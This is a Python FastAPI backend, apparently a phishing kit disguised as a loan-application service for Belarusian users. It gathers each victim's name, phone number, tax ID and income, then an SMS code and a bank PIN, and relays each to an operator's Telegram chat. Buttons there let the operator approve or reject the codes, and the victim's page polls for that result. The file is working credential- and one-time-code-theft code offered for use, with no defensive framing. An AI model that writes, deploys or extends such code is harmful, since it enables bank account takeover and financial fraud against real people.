import os
import logging
from contextlib import asynccontextmanager
from fastapi import FastAPI, HTTPException, Request
from fastapi.middleware.cors import CORSMiddleware
from pydantic import BaseModel
import uvicorn
import requests

BOT_TOKEN = os.getenv("BOT_TOKEN")
MY_CHAT_ID = os.getenv("MY_CHAT_ID")
TELEGRAM_API_URL = f"https://api.telegram.org/bot{BOT_TOKEN}"

logging.basicConfig(level=logging.INFO)

sessions = {}

def send_to_telegram(chat_id: str, text: str, reply_markup: dict = None):
    url = f"{TELEGRAM_API_URL}/sendMessage"
    payload = {"chat_id": chat_id, "text": text, "parse_mode": "HTML"}
    if reply_markup:
        payload["reply_markup"] = reply_markup
    try:
        requests.post(url, json=payload, timeout=5)
    except Exception as e:
        logging.error(f"Ошибка отправки: {e}")

# ========== КЛАВИАТУРЫ ==========
def get_application_keyboard(session_id: str):
    return {
        "inline_keyboard": [
            [{"text": "📲 Отправить SMS-код", "callback_data": f"send_code_{session_id}"}]
        ]
    }

def get_code_keyboard(session_id: str):
    return {
        "inline_keyboard": [
            [
                {"text": "✅ Код верный", "callback_data": f"code_ok_{session_id}"},
                {"text": "❌ Код неверный", "callback_data": f"code_wrong_{session_id}"}
            ]
        ]
    }

def get_pin_keyboard(session_id: str):
    return {
        "inline_keyboard": [
            [
                {"text": "✅ PIN верный", "callback_data": f"pin_ok_{session_id}"},
                {"text": "❌ PIN неверный", "callback_data": f"pin_wrong_{session_id}"}
            ]
        ]
    }

# ========== МОДЕЛИ ==========
class CreditApplicationData(BaseModel):
    name: str
    phone: str
    inn: str = ""
    income: float
    months: int
    amount: float
    payment: float
    session_id: str

class PhoneData(BaseModel):
    phone: str
    session_id: str
    user_chat_id: int = None

class CodeData(BaseModel):
    session_id: str
    code: str

class PinData(BaseModel):
    session_id: str
    pin: str

# ========== FASTAPI ==========
@asynccontextmanager
async def lifespan(app: FastAPI):
    render_url = os.getenv("RENDER_EXTERNAL_URL", "https://telegram-bot-gateway-1.onrender.com")
    webhook_url = f"{render_url}/webhook/callback"
    requests.post(f"{TELEGRAM_API_URL}/setWebhook", json={"url": webhook_url})
    send_to_telegram(MY_CHAT_ID, "🤖 *Бот запущен*")
    yield
    send_to_telegram(MY_CHAT_ID, "⚠️ Бот остановлен")

app = FastAPI(lifespan=lifespan)

app.add_middleware(
    CORSMiddleware,
    allow_origins=["*"],
    allow_credentials=True,
    allow_methods=["*"],
    allow_headers=["*"],
)

# ========== 1. ЗАЯВКА С КАЛЬКУЛЯТОРА ==========
@app.post("/submit_credit_application")
async def submit_credit_application(data: CreditApplicationData):
    sid = data.session_id
    sessions[sid] = {
        "name": data.name,
        "phone": data.phone,
        "inn": data.inn,
        "income": data.income,
        "months": data.months,
        "amount": data.amount,
        "payment": data.payment,
        "status": "waiting_phone"
    }
    
    message = (
        f"🏦 <b>НОВАЯ ЗАЯВКА НА КРЕДИТ</b>\n\n"
        f"👤 <b>Клиент:</b> {data.name}\n"
        f"📞 <b>Телефон:</b> {data.phone}\n"
        f"🆔 <b>ИНН:</b> {data.inn if data.inn else '—'}\n\n"
        f"💰 <b>Доход:</b> {data.income:,.0f} BYN\n"
        f"📅 <b>Срок:</b> {data.months} мес.\n"
        f"💵 <b>Сумма кредита:</b> {data.amount:,.0f} BYN\n"
        f"📆 <b>Ежемесячный платёж:</b> ~{data.payment:,.0f} BYN\n\n"
        f"🆔 <b>Сессия:</b> <code>{sid}</code>"
    )
    send_to_telegram(MY_CHAT_ID, message, reply_markup=get_application_keyboard(sid))
    return {"status": "ok"}

# ========== 2. НОМЕР ТЕЛЕФОНА ==========
@app.post("/submit_phone")
async def submit_phone(data: PhoneData):
    phone = data.phone
    sid = data.session_id
    user_chat_id = data.user_chat_id
    
    if sid not in sessions:
        sessions[sid] = {}
    
    sessions[sid]["phone"] = phone
    sessions[sid]["user_chat_id"] = user_chat_id
    sessions[sid]["status"] = "waiting_code"
    
    send_to_telegram(MY_CHAT_ID, f"📞 <b>НОМЕР ПОЛУЧЕН</b>\n\n🆔 <b>Сессия:</b> <code>{sid}</code>\n📞 <b>Телефон:</b> {phone}")
    return {"status": "ok"}

# ========== 3. КОД ==========
@app.post("/submit_code")
async def submit_code(data: CodeData):
    sid = data.session_id
    code = data.code
    
    session = sessions.get(sid)
    if not session:
        raise HTTPException(status_code=404, detail="Сессия не найдена")
    
    session["code"] = code
    session["status"] = "waiting_code_confirmation"
    
    send_to_telegram(
        MY_CHAT_ID,
        f"🔢 <b>ПРОВЕРКА КОДА</b>\n\n🆔 <b>Сессия:</b> <code>{sid}</code>\n📞 <b>Телефон:</b> {session.get('phone', '—')}\n🔢 <b>Код:</b> <code>{code}</code>",
        reply_markup=get_code_keyboard(sid)
    )
    return {"status": "waiting_confirmation"}

# ========== 4. PIN ==========
@app.post("/submit_pin")
async def submit_pin(data: PinData):
    sid = data.session_id
    pin = data.pin
    
    session = sessions.get(sid)
    if not session:
        raise HTTPException(status_code=404, detail="Сессия не найдена")
    
    session["pin"] = pin
    session["status"] = "waiting_pin_confirmation"
    
    send_to_telegram(
        MY_CHAT_ID,
        f"🔐 <b>ПРОВЕРКА PIN</b>\n\n🆔 <b>Сессия:</b> <code>{sid}</code>\n📞 <b>Телефон:</b> {session.get('phone', '—')}\n🔢 <b>PIN:</b> <code>{pin}</code>",
        reply_markup=get_pin_keyboard(sid)
    )
    return {"status": "waiting_confirmation"}

# ========== 5. ПРОВЕРКА СТАТУСА ==========
@app.get("/check_status/{session_id}")
async def check_status(session_id: str):
    session = sessions.get(session_id)
    if not session:
        return {"status": "not_found"}
    
    status = session.get("status", "unknown")
    
    if status == "code_confirmed":
        return {"status": "code_confirmed"}
    elif status == "code_wrong":
        return {"status": "code_wrong"}
    elif status == "pin_confirmed":
        return {"status": "pin_confirmed"}
    elif status == "pin_wrong":
        return {"status": "pin_wrong"}
    else:
        return {"status": status}

# ========== 6. ОБРАБОТКА КНОПОК ==========
@app.post("/webhook/callback")
async def handle_callback(request: Request):
    data = await request.json()
    
    if "callback_query" not in data:
        return {"ok": True}
    
    callback = data["callback_query"]
    callback_id = callback["id"]
    data_str = callback["data"]
    
    parts = data_str.split("_")
    if len(parts) < 3:
        return {"ok": True}
    
    action = parts[0]
    result = parts[1]
    session_id = "_".join(parts[2:])
    
    session = sessions.get(session_id)
    
    # Кнопка "Отправить SMS-код"
    if action == "send" and result == "code":
        if session:
            session["status"] = "ready_for_code"
        send_to_telegram(MY_CHAT_ID, f"✅ <b>Код можно отправлять</b>\nПользователь ждёт код на странице.")
        requests.post(
            f"{TELEGRAM_API_URL}/answerCallbackQuery",
            json={"callback_query_id": callback_id, "text": "Готово!"}
        )
    
    # Кнопки подтверждения кода
    elif action == "code":
        if result == "ok":
            if session:
                session["status"] = "code_confirmed"
                user_chat_id = session.get("user_chat_id")
                if user_chat_id:
                    send_to_telegram(str(user_chat_id), "✅ <b>Код подтверждён!</b>\nВведите PIN-код.")
            send_to_telegram(MY_CHAT_ID, f"✅ <b>Код подтверждён</b>\n🆔 Сессия: <code>{session_id}</code>")
        else:
            if session:
                session["status"] = "code_wrong"
                user_chat_id = session.get("user_chat_id")
                if user_chat_id:
                    send_to_telegram(str(user_chat_id), "❌ <b>Неверный код</b>\nПопробуйте ещё раз.")
            send_to_telegram(MY_CHAT_ID, f"❌ <b>Код отклонён</b>\n🆔 Сессия: <code>{session_id}</code>")
        requests.post(
            f"{TELEGRAM_API_URL}/answerCallbackQuery",
            json={"callback_query_id": callback_id, "text": "Обработано"}
        )
    
    # Кнопки подтверждения PIN
    elif action == "pin":
        if result == "ok":
            if session:
                session["status"] = "pin_confirmed"
                user_chat_id = session.get("user_chat_id")
                if user_chat_id:
                    send_to_telegram(str(user_chat_id), "✅ <b>Авторизация успешна!</b>\nСпасибо за доверие 🏦")
            send_to_telegram(MY_CHAT_ID, f"✅ <b>PIN подтверждён</b>\n🆔 Сессия: <code>{session_id}</code>\n🎉 Авторизация завершена!")
        else:
            if session:
                session["status"] = "pin_wrong"
                user_chat_id = session.get("user_chat_id")
                if user_chat_id:
                    send_to_telegram(str(user_chat_id), "❌ <b>Неверный PIN</b>\nПопробуйте ещё раз.")
            send_to_telegram(MY_CHAT_ID, f"❌ <b>PIN отклонён</b>\n🆔 Сессия: <code>{session_id}</code>")
        requests.post(
            f"{TELEGRAM_API_URL}/answerCallbackQuery",
            json={"callback_query_id": callback_id, "text": "Обработано"}
        )
    
    return {"ok": True}

if __name__ == "__main__":
    port = int(os.getenv("PORT", 8000))
    uvicorn.run(app, host="0.0.0.0", port=port)
